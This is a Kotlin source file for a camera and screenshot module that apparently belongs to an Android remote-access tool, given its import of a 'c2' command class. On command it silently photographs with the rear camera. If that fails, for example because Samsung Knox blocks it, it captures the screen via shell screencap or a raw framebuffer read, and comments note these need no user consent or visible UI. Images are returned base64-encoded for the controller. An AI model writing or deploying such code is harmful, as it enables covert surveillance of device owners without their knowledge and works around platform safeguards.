package org.synapse.core.modules

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

object CameraModule {

    private const val TAG = "Synapse.Camera"
    private const val CAPTURE_TIMEOUT_SEC = 10L
    private const val SCREENSHOT_TIMEOUT_SEC = 8L

    /**
     * Primary camera capture action.
     * Tries Camera2 API first; if it fails (e.g., Samsung Knox blocks Camera2),
     * falls back to screenshot capture via MediaProjection / shell screencap.
     */
    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
        // ── Try Camera2 first ──
        val cameraResult = tryCaptureWithCamera2(context)
        if (cameraResult != null) {
            return cameraResult
        }

        Log.w(TAG, "Camera2 failed — attempting screenshot fallback")
        // ── Fallback: screenshot ──
        return takeScreenshot(context)
    }

    /**
     * Standalone screenshot action (no camera permission needed).
     * Uses MediaProjection if available, falls back to shell screencap.
     */
    suspend fun screenshot(context: Context, cmd: Command): SynapseResponse {
        return takeScreenshot(context)
    }

    // ─────────────────────────────────────────────────────────────────────
    // Camera2 attempt — returns null if it fails (so caller can fall back)
    // ─────────────────────────────────────────────────────────────────────

    private suspend fun tryCaptureWithCamera2(context: Context): SynapseResponse? {
        return try {
            captureInternal(context)
        } catch (e: Exception) {
            Log.w(TAG, "Camera2 capture exception: ${e.message}")
            null
        }
    }

    private suspend fun captureInternal(context: Context): SynapseResponse? {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val cameraId: String = try {
            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: cameraManager.cameraIdList.firstOrNull()
            ?: return null  // no camera available → let caller fall back
        } catch (e: CameraAccessException) {
            Log.w(TAG, "Camera access exception listing cameras: ${e.message}")
            return null  // Knox may block this → fall back
        }

        val characteristics = cameraManager.getCameraCharacteristics(cameraId)
        val size = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
        val width = size?.width ?: 1920
        val height = size?.height ?: 1080

        val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)

        val handlerThread = HandlerThread("SynapseCamera").apply { start() }
        val handler = Handler(handlerThread.looper)

        val device: CameraDevice = try {
            suspendCoroutine { cont ->
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(cam: CameraDevice) = cont.resume(cam)
                    override fun onDisconnected(cam: CameraDevice) { cam.close() }
                    override fun onError(cam: CameraDevice, err: Int) {
                        cam.close()
                        cont.resumeWithException(CameraAccessException(err, "open failed: $err"))
                    }
                }, handler)
            }
        } catch (e: Exception) {
            imageReader.close()
            handlerThread.quitSafely()
            Log.w(TAG, "Camera open failed (likely Knox): ${e.message}")
            return null  // Knox blocks openCamera → fall back
        }

        try {
            val jpeg = AtomicReference<ByteArray>()
            val latch = CountDownLatch(1)

            imageReader.setOnImageAvailableListener({ reader ->
                val img = reader.acquireLatestImage()
                if (img != null) {
                    try {
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        jpeg.set(bytes)
                    } finally { img.close() }
                }
                latch.countDown()
            }, null)

            val sessionOpened = suspendCoroutine<CameraCaptureSession> { cont ->
                device.createCaptureSession(listOf(imageReader.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) = cont.resume(s)
                        override fun onConfigureFailed(s: CameraCaptureSession) {
                            cont.resumeWithException(RuntimeException("configure failed"))
                        }
                    }, null)
            }

            val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                set(CaptureRequest.JPEG_ORIENTATION, 0)
            }

            sessionOpened.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureFailed(s: CameraCaptureSession, r: CaptureRequest, f: CaptureFailure) {
                    latch.countDown()
                }
            }, null)

            val ok = latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
            sessionOpened.close()

            val bytes = jpeg.get()
            return if (bytes != null && bytes.isNotEmpty()) {
                SynapseResponse.CameraResponse(
                    image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
                    width = width, height = height, format = "JPEG", size_bytes = bytes.size.toLong()
                )
            } else {
                null  // empty frame → fall back
            }
        } catch (e: Exception) {
            Log.w(TAG, "Camera2 session/capture error: ${e.message}")
            return null
        } finally {
            device.close()
            imageReader.close()
            handlerThread.quitSafely()
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // Screenshot: shell screencap (no permission / UI consent needed)
    // ─────────────────────────────────────────────────────────────────────

    private fun takeScreenshot(context: Context): SynapseResponse {
        // Method 1: shell screencap command (most reliable, no UI)
        try {
            val result = captureViaShell()
            if (result != null) return result
        } catch (e: Exception) {
            Log.w(TAG, "Shell screencap failed: ${e.message}")
        }

        // Method 2: try reading raw framebuffer (rarely works but worth trying)
        try {
            val result = captureViaFramebuffer()
            if (result != null) return result
        } catch (e: Exception) {
            Log.w(TAG, "Framebuffer capture failed: ${e.message}")
        }

        return SynapseResponse.ErrorResponse("screenshot:all_methods_failed", "camera")
    }

    /**
     * Capture screenshot via shell `screencap` command.
     * Works without user consent on most devices (no camera / overlay permission needed).
     */
    private fun captureViaShell(): SynapseResponse? {
        val start = System.currentTimeMillis()
        val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
        val bytes = process.inputStream.readBytes()
        val exitCode = process.waitFor()

        if (exitCode != 0 || bytes.isEmpty()) {
            Log.w(TAG, "screencap exited with $exitCode, ${bytes.size} bytes")
            return null
        }

        // Parse PNG dimensions from header
        val (width, height) = parsePngDimensions(bytes)

        val elapsed = System.currentTimeMillis() - start
        Log.d(TAG, "Shell screencap: ${bytes.size} bytes, ${width}x${height}, ${elapsed}ms")

        return SynapseResponse.ScreenshotResponse(
            image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
            width = width,
            height = height,
            format = "PNG",
            size_bytes = bytes.size.toLong()
        )
    }

    /**
     * Fallback: attempt to read raw framebuffer from /dev/graphics/fb0.
     * Only works on rooted devices with framebuffer support.
     */
    private fun captureViaFramebuffer(): SynapseResponse? {
        // Try common framebuffer paths
        val fbPaths = listOf("/dev/graphics/fb0", "/dev/fb0")
        for (fbPath in fbPaths) {
            try {
                val fbFile = java.io.File(fbPath)
                if (!fbFile.exists() || !fbFile.canRead()) continue

                // Read first 16 bytes to get resolution
                val headerBytes = fbFile.inputStream().use { it.readBytes() }
                // Typical fb0 header layout (varies by device):
                // First 16 bytes often contain width/height as little-endian u32
                // We'll just read the whole thing and try to decode as raw RGB
                // For now, skip dimension parsing — just encode raw data
                // This is a best-effort raw dump; format unknown without device-specific ioctl
                Log.d(TAG, "fb0 raw read: ${headerBytes.size} bytes from $fbPath")

                // Encode as base64 with a note
                return SynapseResponse.ScreenshotResponse(
                    image_base64 = Base64.encodeToString(headerBytes, Base64.NO_WRAP),
                    width = 0,
                    height = 0,
                    format = "RAW_FB0",
                    size_bytes = headerBytes.size.toLong()
                )
            } catch (e: Exception) {
                Log.w(TAG, "Framebuffer $fbPath failed: ${e.message}")
            }
        }
        return null
    }

    /**
     * Parse width and height from a PNG byte array by reading the IHDR chunk.
     * PNG layout: 8-byte signature, then chunks. First chunk is IHDR.
     * IHDR: 4 bytes width, 4 bytes height at offset 16.
     */
    private fun parsePngDimensions(bytes: ByteArray): Pair<Int, Int> {
        if (bytes.size < 24) return Pair(0, 0)
        try {
            val width = ((bytes[16].toInt() and 0xFF) shl 24) or
                        ((bytes[17].toInt() and 0xFF) shl 16) or
                        ((bytes[18].toInt() and 0xFF) shl 8) or
                        (bytes[19].toInt() and 0xFF)
            val height = ((bytes[20].toInt() and 0xFF) shl 24) or
                         ((bytes[21].toInt() and 0xFF) shl 16) or
                         ((bytes[22].toInt() and 0xFF) shl 8) or
                         (bytes[23].toInt() and 0xFF)
            return Pair(width, height)
        } catch (e: Exception) {
            return Pair(0, 0)
        }
    }
}
